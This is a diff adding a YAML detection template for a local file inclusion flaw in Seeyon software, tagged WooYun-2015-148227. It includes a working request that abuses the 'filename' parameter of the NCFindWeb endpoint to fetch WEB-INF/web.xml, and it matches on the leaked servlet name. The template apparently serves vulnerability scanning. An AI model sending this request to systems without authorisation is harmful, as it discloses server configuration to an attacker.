@@ -1,0 +1,31 @@
+id: wooyun-2015-148227
+brief:
+    title: Seeyon WooYun - Local File Inclusion
+    by: princechaddha
+    level: high
+    about: Seeyon WooYun allows remote attackers to include the content of locally stored content and disclose it back to the attacker via local file inclusion.
+    label:
+        - seeyon
+        - wooyun
+        - lfi
+        - zhiyuan
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml'
+      signs:
+        - "on": status
+          status:
+            - 200
+        - "on": word
+          has:
+            - <servlet-name>NCInvokerServlet</servlet-name>
+          in: body
+          need: all
+        - "on": word
+          has:
+            - application/xml
+          in: header
+          need: all
